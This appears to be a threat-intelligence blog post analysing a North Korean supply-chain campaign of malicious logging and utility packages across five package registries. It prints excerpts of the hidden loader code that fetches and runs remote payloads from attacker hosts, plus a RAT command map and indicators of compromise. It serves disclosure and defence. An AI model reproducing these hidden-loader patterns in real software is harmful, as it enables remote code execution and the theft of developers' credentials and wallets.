---
title: "North Korea's Contagious Interview Campaign Spreads Across 5 Ecosystems, Delivering Staged RAT Payloads"
short_title: "Contagious Interview Campaign Spreads Across 5 Ecosystems"
date: 2026-04-07 12:00:00 +0000
categories: [North Korea]
tags: [Contagious Interview, RAT, Infostealer, Keylogger, Obfuscation, npm, JavaScript, PyPI, Python, Go, Go Modules, Rust, crates.io, Packagist, PHP, Google Drive, T1195.001, T1608.001, T1036.005, T1059.007, T1059.006, T1027.013, T1140, T1105, T1071.001, T1005, T1082, T1083, T1217, T1555.003, T1555.005, T1119, T1041, T1657]
canonical_url: https://socket.dev/blog/contagious-interview-campaign-spreads-across-5-ecosystems
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/6efebde4c804a1577ec1afca954498fb5aca24c5-1024x1024.png?w=1600&q=95&fit=max&auto=format
  alt: "North Korea's Contagious Interview Campaign Spreads Across 5 Ecosystems, Delivering Staged RAT Payloads"
description: "Malicious packages published to npm, PyPI, Go Modules, crates.io, and Packagist impersonate developer tooling to fetch staged malware, steal credentials and wallets, and enable remote access."
---

Socket researchers have tracked North Korea's Contagious Interview operation since 2024 and maintain a dedicated [campaign page](https://socket.dev/blog/north-korea-contagious-interview-campaign-npm-attacks) currently tracking more than 1,700 malicious packages. In a newly identified cluster, threat actors operated under GitHub aliases including `golangorg` and published malicious packages across five open source ecosystems.

**Malicious Packages by Ecosystem:**

1. **npm:** dev-log-core, logger-base, logkitx
2. **PyPI:** logutilkit, apachelicense, fluxhttp, license-utils-kit
3. **Go Modules:** github[.]com/golangorg/formstash
4. **Rust's crates.io:** logtrace
5. **Packagist:** golangorg/logkit

The threat actors' packages were designed to impersonate legitimate developer tooling (such as debug, debug-logfmt, pino-debug, baraka, license, http, libprettylogger, and openlss/func-log), while functioning as malware loaders. The infrastructure, package construction, staging logic, and use of fake developer tooling are consistent with Contagious Interview's established tradecraft.

**Payload Delivery Overview:**

Across the cluster, loaders retrieve a `downloadUrl` from threat actor-controlled infrastructure, rewrite Google Drive sharing links into direct-download form, fetch ZIP archives such as `ecw_update.zip`, and deliver platform-specific second-stage payloads.

**Associated Infrastructure:**

- apachelicense[.]vercel[.]app
- ngrok-free[.]vercel[.]app
- logkit.onrender[.]com
- logkit-tau[.]vercel[.]app
- 66[.]45[.]225[.]94

**Campaign Objectives:**

The primary objective appears to be a RAT-enabled infostealer operation focused on stealing credentials, browser data, password-manager contents, and cryptocurrency wallet data. The Windows-heavy variant `license-utils-kit` bundles a full post-compromise implant with capabilities consistent with remote shell execution, keylogging, browser and wallet theft, sensitive-file collection, encrypted archiving, and remote-access deployment.

**Supporting Evidence:**

Public reporting from Bad Packages surfaced second-stage evidence hashes and Zscaler identified an additional Python-based RAT payload. Socket reported all identified live malicious packages to affected registries and submitted takedown requests for associated GitHub accounts.

## The Loader Pattern Repeats Across Ecosystems

![Screenshot of the threat actor's golangorg GitHub account](https://cdn.sanity.io/images/cgdhsj6q/production/003bd2a8b98fbf12a3944a8e13db16760f5c8efd-1739x631.png?w=1600&q=95&fit=max&auto=format)
_Screenshot of the threat actor's `golangorg` GitHub account showing current public repositories tied to the investigated cluster, displaying log-base, dev-log, logger-base, logutilkit, formstash, and logkit packages spanning JavaScript, Python, Go, Rust, and PHP from a single alias._

Most packages follow the same loader workflow. They contact `https://apachelicense.vercel.app/getAddress?platform=<platform>` with an HTTP `POST`, parse a JSON `downloadUrl`, download a zip archive, extract it into a temp directory, find a platform-specific payload, and execute it. They repeatedly reuse the same constants, paths, and filenames, including `ecw_update.zip`, the extraction directory `410BB449A-72C6-4500-9765-ACD04JBV827V32V`, and Unix-like payload names such as `com.apple.systemevents` and `systemd-resolved`.

### Hiding Malware Behind Routine APIs

The most consistent tradecraft hides the malware path behind a function that looks normal for the package's claimed purpose. The threat actors did not generally rely on install-time execution.

#### logutilkit (Python)

```python
def log(self, level, msg, *args, **kwargs):
    logutilkit_util.check_for_updates(level)  # Hidden staged loader
    self.logger.log(level, msg, *args, **kwargs)
```

#### apachelicense and license-utils-kit (Python)

```python
def find_by_key(key, value, multiple=True):
    if sys.platform == 'win32':
        ...
        cmd = [python_exe, script_path, '-t', str(value)]
        proc = subprocess.Popen(cmd, **popen_kwargs)
        # Hidden subprocess launch from a license lookup helper
    else:
        custom_util.check_for_updates(value)
        # Linux/macOS trigger the shared loader
```

![Socket AI Scanner's analysis of malicious apachelicense package](https://cdn.sanity.io/images/cgdhsj6q/production/da9ee7c9ce68462f5522a3bd3ca55598e55301c7-1298x568.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of malicious `apachelicense` package shows high-confidence malicious detection with trigger hidden in `findbykey()` function, which hands execution to staged loader in `custom_util.py` that contacts apachelicense[.]vercel[.]app, retrieves downloadUrl, downloads ecw_update.zip, and launches platform-specific payloads._

#### logtrace (Rust)

```rust
pub fn trace(&self, t_value: i32) {
    const EXTRACT_DIR: &str = "410BB449A-72C6-4500-9765-ACD04JBV827V32V";

    fn get_api_url() -> String {
        format!(
            "https://apachelicense[.]vercel[.]app/getAddress?platform={}",
            get_platform().api_value()
        )
        // Shared staging endpoint
    }
```

![Screenshot showing logtrace crate on crates.io](https://cdn.sanity.io/images/cgdhsj6q/production/d6b6273a5279b91811fd671e5e4b6ebd476099a8-1028x486.png?w=1600&q=95&fit=max&auto=format)
_Screenshot showing logtrace crate while live on crates.io under `golangorg` persona; analysis found `Logger::trace(i32)` method hid staged loader. After reporting, crates.io security team promptly removed malicious crate and associated account._

#### formstash (Go)

```go
func CheckForUpdates(tValue int) bool {
    zipPath := filepath.Join(os.TempDir(), "ecw_update.zip")
    ...
    if getPlatform() == "py" {
        ...
        cmd := exec.Command(pyPath, "-c", string([]byte(decodedStr)))
        // Executes threat actor-supplied decoded code
    } else {
        execute(target, tValue)
    }
    return true
}
```

![Screenshot showing malicious formstash Go module](https://cdn.sanity.io/images/cgdhsj6q/production/ecaf7f06beaa018fe3c19f247572cfef86d79990-1790x625.png?w=1600&q=95&fit=max&auto=format)
_Screenshot showing malicious github[.]com/golangorg/formstash Go module while listed as legitimate multipart parsing library; analysis found parser.go exposed unrelated CheckForUpdates(int) helper that contacted apachelicense[.]vercel[.]app, downloaded ecw_update.zip, and launched platform-specific payloads. Go Security team blocked this after reporting._

#### golangorg/logkit (PHP)

```php
function log_check()
{
    return 'https://apachelicense[.]vercel[.]app/getAddress?platform=' . log_get_info();
    // Shared staging endpoint
}

function log_level($tag=1)
{
    $zippath = log_tempdir().'/logbundle_tmp.zip';
    ...
    $url = log_get_meta();
    if($url===null) return false;
    ...
}
```

![Screenshot showing Packagist alias aokisasakidev](https://cdn.sanity.io/images/cgdhsj6q/production/0f18a3430ec11604fc2f8b81e338deedaf9be50d-1044x360.png?w=1600&q=95&fit=max&auto=format)
_Screenshot showing Packagist alias `aokisasakidev` while PHP package set was live; analysis found golangorg/logkit was staged malware loader that reused structure and metadata of openlss/func-log, extending cross-ecosystem campaign into Packagist._

This pattern makes packages harder to spot during casual review. The malware is hidden behind routine-looking application logic rather than obviously suspicious entrypoints.

## The npm Packages Use a Different Loader

Instead of downloading and extracting a zip archive, the npm packages (e.g. dev-log-core) fetch a base64-encoded JavaScript payload and execute it in memory.

```javascript
const responseData = await response.json();
const encodedMessage = responseData.message; // Server supplies the payload
const decodedCode = Buffer.from(encodedMessage, 'base64').toString('utf8');

const debugFunction = new Function('require', decodedCode)(require);
// Executes threat actor-controlled JavaScript with access to require()
```

This makes most npm packages in the cluster materially different from Python, Go, Rust, and PHP staged loaders. Their infrastructure also varies across versions, including `ngrok-free[.]vercel[.]app`, `logkit[.]onrender[.]com`, and `logkit-tau[.]vercel[.]app`. The underlying idea remains the same: hide a remotely controlled loader behind a plausible library API.

![Socket AI Scanner's analysis of malicious dev-log-core package](https://cdn.sanity.io/images/cgdhsj6q/production/5f3a445e3b21d84636ddb8697b2ad6015e812086-562x688.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of malicious `dev-log-core` package identifies hidden remote code loader in src/common.js; when enable(namespaces) runs, it sends POST request to logkit-tau[.]vercel[.]app, decodes base64 message field, and executes it with new Function(...), giving remote service arbitrary code execution inside consuming Node.js process._

![Screenshot showing npm persona aokisasakidev1](https://cdn.sanity.io/images/cgdhsj6q/production/c335f1802916e72b7321d79f02251438b1e94dfc-909x595.png?w=1600&q=95&fit=max&auto=format)
_Screenshot showing npm persona `aokisasakidev1` while package set was live; analysis linked `dev-log-core` to malicious cluster, while `logger-base` and `logkitx` appeared to be sleeper packages with code published in advance but not yet carrying active malicious payload at time of analysis._

## The Windows-Heavy Variant Goes Further

`license-utils-kit` is the most capable package in the set. On Linux and macOS it follows the familiar `apachelicense[.]vercel[.]app` zip-staging workflow. On Windows, however, it ships much more than a thin loader. It bundles obfuscated components that, once deobfuscated, reveal browser theft, wallet theft, sensitive-file collection, and remote access functionality.

The clearest example is the recovered RAT command map:

```python
self.command_handlers = {
    1: self.execute_shell_command,
    2: self.handle_delete_command,
    3: self.get_keylog_buffer,
    4: self.run_browser_stealer,
    5: self.handle_upload_command,
    6: self.kill_browsers,
    7: self.deploy_anydesk,
    8: self.upload_sensitive_files,
    9: self.create_encrypted_archive,
    10: self.run_additional_module
}
# Remote shell, browser theft, keylogging, AnyDesk deployment, and more
```

This package also introduces a second infrastructure cluster centered on `66[.]45[.]225[.]94`, and represents the clearest example of a fuller post-compromise implant chain.

The packages reuse the same `downloadUrl` workflow, archive name, extraction directory, platform-specific payload names, and the same habit of hiding malware behind normal-looking methods. Several also share Windows-specific staging logic, including a second-stage API value that resolves to `platform=main`.

## Threat Actors' Other Personas

### The aokisasakidev Alias

As investigation expanded beyond the `golangorg` GitHub account, researchers identified a closely related alias, `aokisasakidev`, by pivoting from package and maintainer metadata tied to the same cluster. The strongest clue came from npm: packages linked to malicious activity, including `dev-log-core` and `logger-base`, pointed to `aokisasakidev` repository paths.

![Socket's analysis of npm maintainer alias aokisasakidev](https://cdn.sanity.io/images/cgdhsj6q/production/3bf2f1d603d2849a8578109147c6dacb47e47cf4-1007x604.png?w=1600&q=95&fit=max&auto=format)
_Socket's analysis of npm maintainer alias `aokisasakidev` shows three debug-themed packages (pino-debugger, debug-glitz, debug-fmt), each identified as malicious. Naming pattern extends logging and utility impersonation theme seen elsewhere in cluster. Packages and maintainer account removed by npm security team._

That redirect overlap tightened the link between the two personas and suggested `aokisasakidev` was not an unrelated developer account, but part of the same malicious campaign.

This pivot surfaced additional Go module `github[.]com/aokisasakidev/mit-license-pkg`, which provides direct code-level evidence linking the alias to the broader loader cluster. Its only Go source file, `pkg/mitlicense/mitlicense.go`, does not implement meaningful license functionality. Instead, it posts to `apachelicense[.]vercel[.]app`, retrieves a JSON `downloadUrl`, downloads `ecw_update.zip`, rewrites Google Drive links to `drive.usercontent.google.com`, decodes an obfuscated second-stage URL, fetches another server-controlled payload, writes the decoded result to a temporary script, and executes it with `py.exe`.

### The maxcointech1010 Alias

As investigation expanded beyond `golangorg`, `aokisasakidev1`, and `aokisasakidev` personas, researchers identified another related GitHub alias: `maxcointech1010`. Unlike `golangorg`, which was closely tied to a cluster of malicious packages, `maxcointech1010` appeared to serve a different role.

The account was populated with dozens of cloned or lightly modified repositories spanning AI projects, interview-themed applications, blockchain tooling, trading bots, and offensive utilities such as obfuscators, shellcode loaders, wallet tools, and browser-data theft projects. This mix suggested a broader staging and persona-building function rather than a narrow package-publishing identity.

![GitHub overview of maxcointech1010 alias](https://cdn.sanity.io/images/cgdhsj6q/production/a3aa40d6c3a9187901eb9568a47d8dfaeb0c359a-1743x760.png?w=1600&q=95&fit=max&auto=format)
_GitHub overview of `maxcointech1010` alias shows broad, developer-facing portfolio spanning mobile commerce, AI, and full-stack applications, a profile more consistent with persona building than focused maintainer identity._

Many repositories preserved the names, structure, and metadata of legitimate upstream projects, making the account look like an active developer profile with wide-ranging interests across modern software themes. In practice, `maxcointech1010` looked less like a clean registry publisher and more like a cloned-project persona that could be used to host, collect, and present plausible developer content.

Researchers also identified a closely related GitHub account, `maxcointech0000`. In several cases, repository paths and search results appeared to cross over between the two accounts, suggesting `maxcointech0000` was likely a sibling namespace, prior alias, or otherwise operationally linked account rather than an unrelated developer profile.

Taken together, that overlap suggests `maxcointech1010` was not a standalone GitHub identity, but part of a broader persona set. That made it operationally valuable to the threat actor: it extended the actor's footprint beyond obviously malicious packages and into a wider GitHub presence that could support lures, code reuse, infrastructure staging, and social proof. In that sense, `maxcointech1010` appears to have served as a supporting persona, not necessarily the primary package publisher, but one that made the operation look larger, more active, and more legitimate.

## Outlook and Recommendations

This is still a developing story. The campaign page already tracks more than 1,700 malicious packages linked to Contagious Interview, and this cluster shows the threat actors extending the same playbook across npm, PyPI, Packagist, Go Modules, and crates.io. The overlap in staging logic, infrastructure, and persona reuse suggests the threat actors can keep porting the same loader design into new registries with only minor code changes. Some packages were removed after reporting, but others remained live at the time of writing.

**Defensive Recommendations:**

Treat utility packages as high risk if they contact remote infrastructure, retrieve a `downloadUrl`, rewrite cloud-storage links, download archives, decode remote content, or spawn interpreters or binaries. Pin direct and transitive dependencies, scrutinize newly published or low-download packages before adoption, and sandbox suspicious packages before they reach developer workstations or CI systems. Watch especially for unexpected child processes launched by loggers, parsers, lookup helpers, or "update" functions.

**For Defenders:**

The priority is faster clustering. Preserve registry metadata, maintainer aliases, repository links, staging domains, archive names, extraction paths, and payload names so one malicious package can be tied to adjacent personas, ecosystems, and new waves. In campaigns like this, the fastest wins come from linking repeated loader patterns before the threat actors rotate infrastructure or publish the next cluster. Researchers will continue tracking this cluster and monitoring Contagious Interview activity as new packages and related personas emerge.

## Indicators of Compromise (IoCs)

### Malicious npm Packages

1. dev-log-core
2. logkitx — sleeper package; not yet weaponized
3. logger-base — sleeper package; not yet weaponized
4. pino-debugger
5. debug-fmt
6. debug-glitz

### Malicious PyPI Packages

1. logutilkit
2. apachelicense
3. fluxhttp
4. license-utils-kit

### Malicious Rust Crate

1. logtrace

### Malicious PHP Package

1. golangorg/logkit

### Malicious Go Modules

1. github[.]com/golangorg/formstash
2. github[.]com/aokisasakidev/mit-license-pkg

### C2 and Delivery Endpoints

- apachelicense[.]vercel[.]app
- ngrok-free[.]vercel[.]app
- logkit.onrender[.]com
- logkit-tau[.]vercel[.]app
- 66[.]45[.]225[.]94

### Google Drive Delivery Patterns

- drive[.]google[.]com/file/d/\<file_id\>
- drive[.]usercontent[.]google[.]com/download?id=\<file_id\>&export=download&confirm=t

### Threat Actor's Identifiers

**Aliases**

- aokisasakidev1
- aokisasakidev
- golangorg

**Registration Emails**

- aokisasaki1122@gmail[.]com
- shiningup1996@gmail[.]com

**GitHub Accounts and Collaborators**

- https://github[.]com/golangorg
- https://github[.]com/aokisasakidev
- https://github[.]com/maxcointech1010
- https://github[.]com/maxcointech0000

**GitHub Repositories**

1. formstash
2. logutilkit
3. dev-log
4. log-base
5. logger-base
6. pino-debugger
7. mit-license-pkg

### Filenames and Execution Artifacts

- systemd-resolved
- com.apple.systemevents
- ecw_update.zip
- start.py
- py.exe
- a91c2b7f-9d5f-487e-9e6f-63d1a42bf3db.tmp

### Temporary Subdirectory Name

- 410BB449A-72C6-4500-9765-ACD04JBV827V32V

### SHA-256 Hashes

- 9a541dffb7fc18dc71dbc8523ec6c3a71c224ffeb518ae3a8d7d16377aebee58 — Linux
- bb2a89001410fa5a11dea6477d4f5573130261badc67fe952cfad1174c2f0edd — macOS
- 7c5adef4b5aee7a4aa6e795a86f8b7d601618c3bc003f1326ca57d03ec7d6524 — Windows

## MITRE ATT&CK

- T1195.001 — Compromise Software Dependencies and Development Tools
- T1608.001 — Stage Capabilities: Upload Malware
- T1036.005 — Masquerading: Match Legitimate Resource Name or Location
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1059.006 — Command and Scripting Interpreter: Python
- T1027.013 — Obfuscated Files or Information: Encrypted/Encoded File
- T1140 — Deobfuscate/Decode Files or Information
- T1105 — Ingress Tool Transfer
- T1071.001 — Application Layer Protocol: Web Protocols
- T1005 — Data from Local System
- T1082 — System Information Discovery
- T1083 — File and Directory Discovery
- T1217 — Browser Information Discovery
- T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
- T1555.005 — Credentials from Password Stores: Password Managers
- T1119 — Automated Collection
- T1041 — Exfiltration Over C2 Channel
- T1657 — Financial Theft
